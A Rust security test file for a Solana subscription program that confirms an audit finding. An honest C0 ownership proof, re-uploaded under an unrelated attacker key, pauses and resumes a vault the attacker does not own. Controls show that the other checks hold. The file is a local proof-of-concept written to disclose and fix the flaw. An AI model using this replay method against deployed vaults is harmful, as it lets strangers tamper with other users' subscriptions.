//! WP0e — the C0 (subscriber-ownership) proof replay against `pause_private_stark`
//! and `resume_private_stark`.
//!
//! # The question this file answers
//!
//! `DESIGN-V2 §3` records a suspected finding:
//!
//! > the path binds only `sha256(commitment)` (`pause_private_stark.rs:110-118`)
//! > and the payer can be anyone (`:47`). A C0 proof seen in chunk data
//! > therefore looks re-uploadable by anyone to pause or resume that vault.
//!
//! This is a *replay* claim, not a *forgery* claim. The C0 circuit proves
//! knowledge of a `subscriber_secret` whose hash is the vault commitment
//! (`stark/src/air/subscriber_ownership.rs`: `commitment = H(secret)`), so a
//! party who knows only the (public) commitment cannot MINT a fresh proof.
//! The question is whether a party who has merely *observed* an honest proof —
//! every proof is uploaded to the verifier in the clear via `write_proof_chunk`,
//! and chunk data is public transaction metadata that every RPC serves and every
//! indexer keeps — can re-upload those same bytes under their own key and drive
//! the vault's pause state.
//!
//! # Why litesvm and why BOTH programs are loaded
//!
//! The pause handler trusts a `ProofBuffer` account that
//!   1. is owned by the STARK verifier program,
//!   2. has `verified == true`,
//!   3. has `circuit_id == 0`,
//!   4. has `authority == payer`, and
//!   5. has `public_inputs_hash == sha256(vault.subscriber_commitment[..8] as u64 LE)`.
//!
//! A fabricated buffer (seeded with `set_account`, `verified = true`) would beg
//! the question — a skeptic rightly says "the real verifier would never have set
//! `verified` for the attacker". The only honest demonstration runs the REAL
//! verifier `.so` on the REPLAYED bytes and shows it sets `verified = true`
//! under the *attacker's* authority (the verifier binds the proof to the public
//! commitment, not to who first produced it), then runs the REAL `zk_shielded`
//! `.so` and shows `pause_private_stark` accepts that buffer for a vault the
//! attacker does not own. So both programs are loaded from their built `.so`.
//!
//! # Building the artifacts under test
//!
//! ```text
//! ~/.local/share/solana/install/releases/3.1.9/solana-release/bin/cargo-build-sbf.exe \
//!     --manifest-path programs/zk_shielded/Cargo.toml
//! ~/.local/share/solana/install/releases/3.1.9/solana-release/bin/cargo-build-sbf.exe \
//!     --manifest-path programs/p01_stark_verifier/Cargo.toml
//! ```
//! `P01_ZK_SHIELDED_SO` and `P01_VERIFIER_SO` override the two paths (this is
//! how the `sbf-litesvm` workflow feeds a same-run build; see WP0g). Without an
//! override they fall back to `target/deploy/{zk_shielded,p01_stark_verifier}.so`,
//! which are the current HEAD artifacts. A STALE `.so` is the likelier failure
//! than a missing one; there is deliberately no skip.
//!
//! # What this file does NOT prove
//!
//! * It says nothing about C1..C7. It is C0-only, because only C0 gates the
//!   subscription pause/resume instructions.
//! * It does not claim the C0 STARK is unsound. The proof it replays is honest;
//!   the gap is at the consumer, which re-accepts a public proof with no
//!   freshness, no one-time-use, and no binding to the subscriber key.
//! * `subscribe_private_stark` is out of scope: the vault is seeded with
//!   `set_account`, exactly as `subscription_lifecycle.rs` does.

use anchor_lang::{AnchorSerialize, Discriminator};
use litesvm::LiteSVM;
use solana_account::Account;
use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_message::Message;
use solana_signer::Signer;
use solana_transaction::Transaction;

use std::path::PathBuf;
use std::str::FromStr;

use zk_shielded::state::SubscriptionVault;

// ---------------------------------------------------------------------------
// Program ids and native programs
// ---------------------------------------------------------------------------

/// `programs/zk_shielded/src/lib.rs:48`.
const ZK_PROGRAM_ID: &str = "GbVM5yvetrSD194Hnn1BXnR56F8ZWNKnij7DoVP9j27c";
/// `programs/p01_stark_verifier/src/lib.rs:59` (`declare_id!`), and the value
/// `pause_private_stark.rs:11-16` hard-codes as `STARK_VERIFIER_PROGRAM_ID`.
/// The buffer must be OWNED by this id, so the verifier `.so` is loaded here.
const VERIFIER_ID: &str = "DGY37k3Jt7cbrfNa9rxyLZVcFB7S7A2NqtVpkh9fWQvs";
const SYSTEM_PROGRAM_ID: &str = "11111111111111111111111111111111";
const COMPUTE_BUDGET_ID: &str = "ComputeBudget111111111111111111111111111111";

// ---------------------------------------------------------------------------
// Anchor error codes, read off `target/idl/zk_shielded.json` (not hand-counted:
// removing an earlier variant renumbers everything after it).
// ---------------------------------------------------------------------------

const E_INVALID_PROOF: u32 = 6000;

// ---------------------------------------------------------------------------
// Verifier `ProofBuffer` upload constants (`p01_stark_verifier::ProofBuffer`).
// ---------------------------------------------------------------------------

/// `ProofBuffer::PROOF_DATA_OFFSET` (`lib.rs`: 8+32+1+4+4+1+32+1).
const PROOF_DATA_OFFSET: usize = 83;
/// `ProofBuffer::MAX_REALLOC_STEP` — Solana's `MAX_PERMITTED_DATA_INCREASE`.
const MAX_REALLOC_STEP: usize = 10_240;
/// Chunk size for `write_proof_chunk`; well under the 1232-byte tx limit.
const CHUNK: usize = 900;
/// The verify instruction alone costs ~992k CU for C0 (`SOUNDNESS-MAP`), over
/// the 200k default, so every send lifts the ceiling first.
const MAX_CU: u32 = 1_400_000;

// ---------------------------------------------------------------------------
// Ids
// ---------------------------------------------------------------------------

fn zk_program_id() -> Address {
    Address::from_str(ZK_PROGRAM_ID).unwrap()
}
fn verifier_id() -> Address {
    Address::from_str(VERIFIER_ID).unwrap()
}
fn system_id() -> Address {
    Address::from_str(SYSTEM_PROGRAM_ID).unwrap()
}

fn zk_so_path() -> PathBuf {
    if let Ok(p) = std::env::var("P01_ZK_SHIELDED_SO") {
        return PathBuf::from(p);
    }
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/deploy/zk_shielded.so")
}
fn verifier_so_path() -> PathBuf {
    if let Ok(p) = std::env::var("P01_VERIFIER_SO") {
        return PathBuf::from(p);
    }
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/deploy/p01_stark_verifier.so")
}

// ---------------------------------------------------------------------------
// Rig — both programs loaded, one funded faucet the per-actor keys draw from
// ---------------------------------------------------------------------------

struct Rig {
    svm: LiteSVM,
    zk: Address,
    verifier: Address,
}

impl Rig {
    fn new() -> Self {
        // `with_transaction_history(0)` disables the duplicate-signature guard:
        // the argument-free pause/resume and resize instructions are sent
        // repeatedly under one blockhash, which the default history would reject
        // as `AlreadyProcessed` before the program ran.
        let mut svm = LiteSVM::new().with_transaction_history(0);
        let zk = zk_program_id();
        let verifier = verifier_id();
        load_program(&mut svm, &zk, &zk_so_path());
        load_program(&mut svm, &verifier, &verifier_so_path());
        Rig { svm, zk, verifier }
    }

    /// A fresh, funded actor. Distinct actors are the whole point: the "victim"
    /// key that would produce the honest proof, and the "attacker" key that only
    /// replays public bytes, are never the same.
    fn actor(&mut self) -> Keypair {
        let kp = Keypair::new();
        self.svm.airdrop(&kp.pubkey(), 100_000_000_000).unwrap();
        kp
    }

    /// Send `ixs` with the CU ceiling raised, `payer` paying, `payer` plus
    /// `extra` signing. `Ok(cu)` or the raw debug string of the failure.
    fn send(&mut self, payer: &Keypair, extra: &[&Keypair], ixs: &[Instruction]) -> Result<u64, String> {
        let mut all = vec![set_cu_limit_ix(MAX_CU)];
        all.extend_from_slice(ixs);
        let msg = Message::new(&all, Some(&payer.pubkey()));
        let blockhash = self.svm.latest_blockhash();
        // De-dupe signers while keeping `payer` present; `Transaction::new`
        // positions signatures by the message's account order.
        let mut signers: Vec<&Keypair> = vec![payer];
        for k in extra {
            if k.pubkey() != payer.pubkey() {
                signers.push(k);
            }
        }
        let tx = Transaction::new(&signers, msg, blockhash);
        match self.svm.send_transaction(tx) {
            Ok(meta) => Ok(meta.compute_units_consumed),
            Err(f) => Err(format!("{:?} | logs: {:?}", f.err, tail(&f.meta.logs, 6))),
        }
    }

    fn must(&mut self, payer: &Keypair, extra: &[&Keypair], ixs: &[Instruction], what: &str) -> u64 {
        self.send(payer, extra, ixs)
            .unwrap_or_else(|e| panic!("{what} failed (rig plumbing, not the finding): {e}"))
    }

    fn read_vault(&self, a: &Address) -> SubscriptionVault {
        let acc = self.svm.get_account(a).expect("vault must exist");
        let mut slice: &[u8] = &acc.data[8..];
        <SubscriptionVault as anchor_lang::AnchorDeserialize>::deserialize(&mut slice)
            .expect("vault must decode")
    }

    fn buffer_account_verified(&self, buffer: &Address) -> bool {
        let acc = self.svm.get_account(buffer).expect("buffer must exist");
        // owner, and the `verified` byte at offset 49 (8+32+1+4+4).
        acc.owner == self.verifier && acc.data.get(49) == Some(&1u8)
    }

    fn buffer_authority(&self, buffer: &Address) -> Address {
        let acc = self.svm.get_account(buffer).expect("buffer must exist");
        Address::from(<[u8; 32]>::try_from(&acc.data[8..40]).expect("authority slice"))
    }
}

fn load_program(svm: &mut LiteSVM, id: &Address, path: &PathBuf) {
    let bytes = std::fs::read(path).unwrap_or_else(|e| {
        panic!(
            "\n============================================================\n\
             CANNOT EXECUTE — a program `.so` is not readable.\n\
             ============================================================\n\
             path  : {}\n\
             error : {}\n\n\
             This test executes real SBF bytecode for BOTH the verifier and\n\
             zk_shielded. Without the binaries there is nothing to execute, so\n\
             it FAILS rather than passing on an empty result. There is no skip.\n\
             Build with cargo-build-sbf 3.1.9 (the one on PATH is too old) or\n\
             pass P01_ZK_SHIELDED_SO / P01_VERIFIER_SO.\n\
             ============================================================\n",
            path.display(),
            e
        )
    });
    svm.add_program(*id, &bytes).expect("add_program");
}

fn tail(v: &[String], n: usize) -> Vec<String> {
    v[v.len().saturating_sub(n)..].to_vec()
}

/// Parse an Anchor `Custom(N)` code out of a failure's debug string.
fn custom_code(err: &str) -> Option<u32> {
    err.split("Custom(")
        .nth(1)
        .and_then(|t| t.split(')').next())
        .and_then(|n| n.trim().parse::<u32>().ok())
}

// ---------------------------------------------------------------------------
// Compute budget
// ---------------------------------------------------------------------------

/// `ComputeBudgetInstruction::SetComputeUnitLimit` = tag 2 + u32 LE.
fn set_cu_limit_ix(limit: u32) -> Instruction {
    let mut data = vec![2u8];
    data.extend_from_slice(&limit.to_le_bytes());
    Instruction {
        program_id: Address::from_str(COMPUTE_BUDGET_ID).unwrap(),
        accounts: vec![],
        data,
    }
}

// ---------------------------------------------------------------------------
// Anchor discriminators
// ---------------------------------------------------------------------------

fn anchor_disc(name: &str) -> [u8; 8] {
    let h = solana_sha256_hasher::hashv(&[format!("global:{name}").as_bytes()]).to_bytes();
    let mut out = [0u8; 8];
    out.copy_from_slice(&h[..8]);
    out
}

// ---------------------------------------------------------------------------
// Verifier instruction builders (a subset of cu_budget.rs, re-derived here so
// this file does not reach into another crate's test module)
// ---------------------------------------------------------------------------

fn buffer_pda(verifier: &Address, authority: &Address, circuit_id: u8) -> (Address, u8) {
    Address::find_program_address(
        &[b"stark_proof", authority.as_ref(), &[circuit_id]],
        verifier,
    )
}

fn ix_init_proof_buffer(
    verifier: &Address,
    buffer: &Address,
    authority: &Address,
    proof_size: u32,
    circuit_id: u8,
) -> Instruction {
    let mut data = anchor_disc("init_proof_buffer").to_vec();
    data.extend_from_slice(&proof_size.to_le_bytes());
    data.push(circuit_id);
    Instruction {
        program_id: *verifier,
        accounts: vec![
            AccountMeta::new(*buffer, false),
            AccountMeta::new(*authority, true),
            AccountMeta::new_readonly(system_id(), false),
        ],
        data,
    }
}

fn ix_resize_proof_buffer(verifier: &Address, buffer: &Address, authority: &Address) -> Instruction {
    Instruction {
        program_id: *verifier,
        accounts: vec![
            AccountMeta::new(*buffer, false),
            AccountMeta::new(*authority, true),
            AccountMeta::new_readonly(system_id(), false),
        ],
        data: anchor_disc("resize_proof_buffer").to_vec(),
    }
}

fn ix_write_chunk(
    verifier: &Address,
    buffer: &Address,
    authority: &Address,
    offset: u32,
    chunk: &[u8],
) -> Instruction {
    let mut data = anchor_disc("write_proof_chunk").to_vec();
    data.extend_from_slice(&offset.to_le_bytes());
    data.extend_from_slice(&(chunk.len() as u32).to_le_bytes()); // borsh Vec<u8> len
    data.extend_from_slice(chunk);
    Instruction {
        program_id: *verifier,
        accounts: vec![
            AccountMeta::new(*buffer, false),
            AccountMeta::new_readonly(*authority, true),
        ],
        data,
    }
}

/// C0's single-instruction path `verify_stark_proof(commitment: u64)`
/// (`lib.rs:172`), a bare u64, DEEP-ALI folded into phase 1.
fn ix_verify_stark_proof(verifier: &Address, buffer: &Address, authority: &Address, commitment: u64) -> Instruction {
    let mut data = anchor_disc("verify_stark_proof").to_vec();
    data.extend_from_slice(&commitment.to_le_bytes());
    Instruction {
        program_id: *verifier,
        accounts: vec![
            AccountMeta::new(*buffer, false),
            AccountMeta::new_readonly(*authority, true),
        ],
        data,
    }
}

// ---------------------------------------------------------------------------
// zk_shielded instruction builders
// ---------------------------------------------------------------------------

fn ix_pause_private_stark(zk: &Address, payer: &Address, vault: &Address, buffer: &Address) -> Instruction {
    Instruction {
        program_id: *zk,
        accounts: vec![
            AccountMeta::new(*payer, true),        // payer: Signer (can be anyone — :47)
            AccountMeta::new(*vault, false),       // vault: Account (mut, PDA)
            AccountMeta::new(*buffer, false),      // stark_proof_buffer: AccountInfo (mut)
        ],
        data: anchor_disc("pause_private_stark").to_vec(),
    }
}

fn ix_resume_private_stark(zk: &Address, payer: &Address, vault: &Address, buffer: &Address) -> Instruction {
    Instruction {
        program_id: *zk,
        accounts: vec![
            AccountMeta::new(*payer, true),
            AccountMeta::new(*vault, false),
            AccountMeta::new(*buffer, false),
        ],
        data: anchor_disc("resume_private_stark").to_vec(),
    }
}

// ---------------------------------------------------------------------------
// A genuine, verifier-honest C0 proof
// ---------------------------------------------------------------------------

/// Generate one honest C0 proof, returning `(proof_bytes, commitment_u64)`.
/// `commitment = H(secret)` is the sole public input; the mask is the publicly
/// reproducible probe mask the in-crate C0 tests use.
fn honest_c0_proof(secret: u64) -> (Vec<u8>, u64) {
    let mask = p01_stark::compact::c0_deterministic_probe_mask();
    let p = p01_stark::compact::generate_subscriber_ownership_proof(secret, &mask);
    assert_eq!(p.circuit_id, 0, "generator returned the wrong circuit");
    assert_eq!(p.public_inputs.len(), 1, "C0 exposes exactly one public input");
    (p.proof_bytes, p.public_inputs[0])
}

/// Upload `proof_bytes` to a fresh `ProofBuffer` owned by `authority`, then, if
/// `verify`, run the verifier's C0 path. Returns the buffer PDA. Every step here
/// is rig plumbing — a failure is a broken rig, not the finding — so it panics.
fn upload_c0(rig: &mut Rig, authority: &Keypair, proof_bytes: &[u8], commitment: u64, verify: bool) -> Address {
    let verifier = rig.verifier;
    let auth_pk = authority.pubkey();
    let (buffer, _bump) = buffer_pda(&verifier, &auth_pk, 0);
    let proof_size = proof_bytes.len();

    rig.must(
        authority,
        &[],
        &[ix_init_proof_buffer(&verifier, &buffer, &auth_pk, proof_size as u32, 0)],
        "init_proof_buffer",
    );

    let target_len = PROOF_DATA_OFFSET + proof_size;
    let mut guard = 0;
    while rig.svm.get_account(&buffer).map(|a| a.data.len()).unwrap_or(0) < target_len {
        rig.must(authority, &[], &[ix_resize_proof_buffer(&verifier, &buffer, &auth_pk)], "resize_proof_buffer");
        guard += 1;
        assert!(guard < (target_len / MAX_REALLOC_STEP) + 8, "resize loop did not converge");
    }

    let mut offset = 0usize;
    while offset < proof_size {
        let end = (offset + CHUNK).min(proof_size);
        rig.must(
            authority,
            &[],
            &[ix_write_chunk(&verifier, &buffer, &auth_pk, offset as u32, &proof_bytes[offset..end])],
            "write_proof_chunk",
        );
        offset = end;
    }

    if verify {
        rig.must(
            authority,
            &[],
            &[ix_verify_stark_proof(&verifier, &buffer, &auth_pk, commitment)],
            "verify_stark_proof",
        );
        assert!(rig.buffer_account_verified(&buffer), "buffer must be verified after the verifier ran");
    }
    buffer
}

// ---------------------------------------------------------------------------
// Vault seeding (private mode) — the commitment's low 8 bytes ARE the C0 input
// ---------------------------------------------------------------------------

/// Seed a private, active, unpaused vault whose `subscriber_commitment[..8]`
/// equals `commitment` in LE, so that
/// `sha256(u64::from_le_bytes(commitment[..8]).to_le_bytes())` — what the pause
/// handler recomputes (`pause_private_stark.rs:110-118`) — matches the hash the
/// verifier stored for the C0 proof.
fn seed_private_vault(rig: &mut Rig, retailer: &Address, commitment: u64) -> Address {
    let mut commitment_bytes = [0u8; 32];
    commitment_bytes[..8].copy_from_slice(&commitment.to_le_bytes());
    let native_mint = Address::from([0u8; 32]);

    let (pda, bump) = Address::find_program_address(
        &[
            SubscriptionVault::SEED_PREFIX,
            retailer.as_ref(),
            commitment_bytes.as_ref(),
            native_mint.as_ref(),
        ],
        &rig.zk,
    );

    let vault = SubscriptionVault {
        subscriber_pubkey: None,
        subscriber_commitment: Some(commitment_bytes),
        retailer: anchor_lang::prelude::Pubkey::from(retailer.to_bytes()),
        token_mint: anchor_lang::prelude::Pubkey::from(native_mint.to_bytes()),
        total_deposited: 200_000_000,
        rate: 50_000_000,
        interval_slots: 100,
        start_slot: 1_000,
        claimed_periods: 0,
        is_active: true,
        is_paused: false,
        pause_slot: None,
        total_paused_slots: 0,
        vk_hash_subscriber: [0u8; 32],
        source_pool: None,
        bump,
        client_stealth_meta: None,
        license_commitment: None,
    };

    let mut data = SubscriptionVault::DISCRIMINATOR.to_vec();
    vault.serialize(&mut data).expect("serialize vault");
    // Trailing `Option`s serialize as a single zero tag; zero-pad to LEN the way
    // live devnet accounts decode appended fields as None.
    data.resize(SubscriptionVault::LEN, 0);

    let lamports = rig.svm.minimum_balance_for_rent_exemption(data.len()) + 200_000_000;
    rig.svm
        .set_account(
            pda,
            Account { lamports, data, owner: rig.zk, executable: false, rent_epoch: 0 },
        )
        .expect("set_account");
    pda
}

// ===========================================================================
// Positive control — the rig actually verifies and pauses
// ===========================================================================

/// If this fails, nothing below can be trusted: it exercises every moving part
/// (both `.so`s, the PDA derivations, the vault seed, the hash encoding, the C0
/// verify path, pause AND resume) on the intended happy path. Here the same key
/// that produced the proof drives the vault — the honest subscriber flow.
#[test]
fn positive_control_an_honest_c0_proof_pauses_then_resumes_its_own_vault() {
    let mut rig = Rig::new();
    let zk = rig.zk;
    let (proof, commitment) = honest_c0_proof(0xC0_FFEE_01);

    let subscriber = rig.actor();
    let retailer = Address::new_unique();
    let vault = seed_private_vault(&mut rig, &retailer, commitment);

    let buffer = upload_c0(&mut rig, &subscriber, &proof, commitment, true);

    // Pause.
    let cu = rig
        .send(&subscriber, &[], &[ix_pause_private_stark(&zk, &subscriber.pubkey(), &vault, &buffer)])
        .expect("honest pause must succeed");
    assert!(rig.read_vault(&vault).is_paused, "vault must be paused after an honest C0 pause");
    println!("[positive] pause consumed {cu} CU");

    // Resume, reusing the very same buffer.
    rig.send(&subscriber, &[], &[ix_resume_private_stark(&zk, &subscriber.pubkey(), &vault, &buffer)])
        .expect("honest resume must succeed");
    assert!(!rig.read_vault(&vault).is_paused, "vault must be un-paused after resume");
}

// ===========================================================================
// THE FINDING — a replayed C0 proof drives a vault under an unrelated key
// ===========================================================================

/// A proof produced once (standing in for a subscriber's proof observed in
/// public chunk data) is re-uploaded, byte for byte, by an unrelated attacker
/// key that never knew the secret. The attacker verifies it under their own
/// authority and pauses — then resumes — a vault they do not own.
///
/// Passing this documents the CONFIRMED finding: `pause_private_stark` /
/// `resume_private_stark` are replayable by any observer of an honest C0 proof.
#[test]
fn finding_a_replayed_c0_proof_pauses_and_resumes_a_vault_under_an_unrelated_key() {
    let mut rig = Rig::new();
    let zk = rig.zk;

    // The subscriber's honest proof — generated once, then treated as PUBLIC.
    let (observed_proof, commitment) = honest_c0_proof(0xC0_FFEE_02);

    // The vault belongs to the subscriber's commitment; a retailer holds it.
    let retailer = Address::new_unique();
    let vault = seed_private_vault(&mut rig, &retailer, commitment);

    // The attacker is a fresh key with no relationship to the subscriber, the
    // retailer, or the secret. It has only the public proof bytes and the public
    // commitment (both readable by anyone from chain).
    let attacker = rig.actor();
    let buffer = upload_c0(&mut rig, &attacker, &observed_proof, commitment, true);

    // The verifier stamped `verified = true` and recorded the attacker as the
    // buffer's authority — it never bound the proof to whoever first produced it.
    assert!(rig.buffer_account_verified(&buffer), "the replayed proof verified");
    assert_eq!(rig.buffer_authority(&buffer), attacker.pubkey(), "the attacker is the buffer authority");

    // Pause a vault the attacker does not own.
    let pause_res = rig.send(
        &attacker,
        &[],
        &[ix_pause_private_stark(&zk, &attacker.pubkey(), &vault, &buffer)],
    );

    // === WP0e ASSERTION (measured reality; the RED phase asserts the SECURE
    // expectation `pause_res.is_err()` instead — see WP0e-report.md) ===
    assert!(
        pause_res.is_ok(),
        "FINDING: a replayed C0 proof paused a vault under an unrelated key — got {pause_res:?}"
    );
    assert!(rig.read_vault(&vault).is_paused, "the vault is now paused by the attacker");

    // Resume it again with the same replayed buffer.
    rig.send(&attacker, &[], &[ix_resume_private_stark(&zk, &attacker.pubkey(), &vault, &buffer)])
        .expect("the attacker also resumes it");
    assert!(!rig.read_vault(&vault).is_paused, "the attacker resumed the vault too");
}

// ===========================================================================
// Discriminating negative controls — the handler is NOT a rubber stamp, so the
// finding above is a real replay and not "it accepts everything".
// ===========================================================================

/// The `verified` flag is load-bearing: an uploaded-but-unverified buffer is
/// refused. (If this passed, the finding would be meaningless.)
#[test]
fn control_an_unverified_buffer_is_refused() {
    let mut rig = Rig::new();
    let zk = rig.zk;
    let (proof, commitment) = honest_c0_proof(0xC0_FFEE_03);
    let retailer = Address::new_unique();
    let vault = seed_private_vault(&mut rig, &retailer, commitment);

    let attacker = rig.actor();
    let buffer = upload_c0(&mut rig, &attacker, &proof, commitment, /* verify = */ false);

    let res = rig.send(&attacker, &[], &[ix_pause_private_stark(&zk, &attacker.pubkey(), &vault, &buffer)]);
    assert_eq!(res.map_err(|e| custom_code(&e)), Err(Some(E_INVALID_PROOF)), "an unverified buffer must be refused");
    assert!(!rig.read_vault(&vault).is_paused, "the vault stays active");
}

/// The commitment binding is live: a valid, verified proof whose commitment
/// differs from the vault's is refused. The replay works ONLY because the
/// commitment is public and matches — not because the hash check is absent.
#[test]
fn control_a_verified_proof_for_a_different_commitment_is_refused() {
    let mut rig = Rig::new();
    let zk = rig.zk;
    let (victim_proof, victim_commitment) = honest_c0_proof(0xC0_FFEE_04);
    let (other_proof, other_commitment) = honest_c0_proof(0xDEAD_BEEF_05);
    assert_ne!(victim_commitment, other_commitment, "the two proofs must bind different commitments");

    let retailer = Address::new_unique();
    let vault = seed_private_vault(&mut rig, &retailer, victim_commitment);

    // The attacker verifies a real, honest proof — but for the WRONG commitment.
    let attacker = rig.actor();
    let buffer = upload_c0(&mut rig, &attacker, &other_proof, other_commitment, true);

    let res = rig.send(&attacker, &[], &[ix_pause_private_stark(&zk, &attacker.pubkey(), &vault, &buffer)]);
    assert_eq!(res.map_err(|e| custom_code(&e)), Err(Some(E_INVALID_PROOF)), "a mismatched commitment must be refused");
    assert!(!rig.read_vault(&vault).is_paused, "the vault stays active");
    let _ = victim_proof; // the victim's own proof is not needed for this control
}

/// The `authority == payer` check is live: the attacker cannot simply POINT the
/// pause at the victim's own buffer — it must re-upload under its own key. This
/// is exactly why replaying the public PROOF BYTES (not the buffer account) is
/// the vector.
#[test]
fn control_the_victims_own_buffer_cannot_be_reused_by_another_payer() {
    let mut rig = Rig::new();
    let zk = rig.zk;
    let (proof, commitment) = honest_c0_proof(0xC0_FFEE_06);
    let retailer = Address::new_unique();
    let vault = seed_private_vault(&mut rig, &retailer, commitment);

    // The subscriber uploads and verifies THEIR OWN buffer (authority = victim).
    let victim = rig.actor();
    let victim_buffer = upload_c0(&mut rig, &victim, &proof, commitment, true);

    // A different payer tries to drive the pause with the victim's buffer.
    let attacker = rig.actor();
    let res = rig.send(&attacker, &[], &[ix_pause_private_stark(&zk, &attacker.pubkey(), &vault, &victim_buffer)]);
    assert_eq!(
        res.map_err(|e| custom_code(&e)),
        Err(Some(E_INVALID_PROOF)),
        "authority != payer must be refused (so the attack must re-upload the bytes, which it can)"
    );
    assert!(!rig.read_vault(&vault).is_paused, "the vault stays active");
}
